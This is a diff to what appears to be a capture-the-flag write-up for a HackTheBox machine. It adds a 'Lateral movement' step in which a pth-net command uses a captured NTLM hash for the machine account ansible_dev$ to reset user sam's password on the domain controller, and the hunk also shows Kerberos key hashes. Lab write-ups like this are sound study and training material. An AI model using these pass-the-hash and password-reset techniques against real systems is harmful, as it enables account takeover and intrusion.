@@ -316,6 +316,14 @@ ansible_dev$:aes256-cts-hmac-sha1-96:e9e2850abbdbd04b6f09aa9dea6ab0504a9e4e4f984
 ansible_dev$:aes128-cts-hmac-sha1-96:f1e40e3681fdae0d4a8eaf0984691157
 ```
 
+### Lateral movement from ansible_dev$ to sam 
+
+```
+pth-net rpc password "sam" 'newP@ssword2022' -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"3eca34dd13a85db79c03178b7b149621" -S DC01.tombwatcher.htb
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+```
+
 ---
 ## Privilege Escalation
 
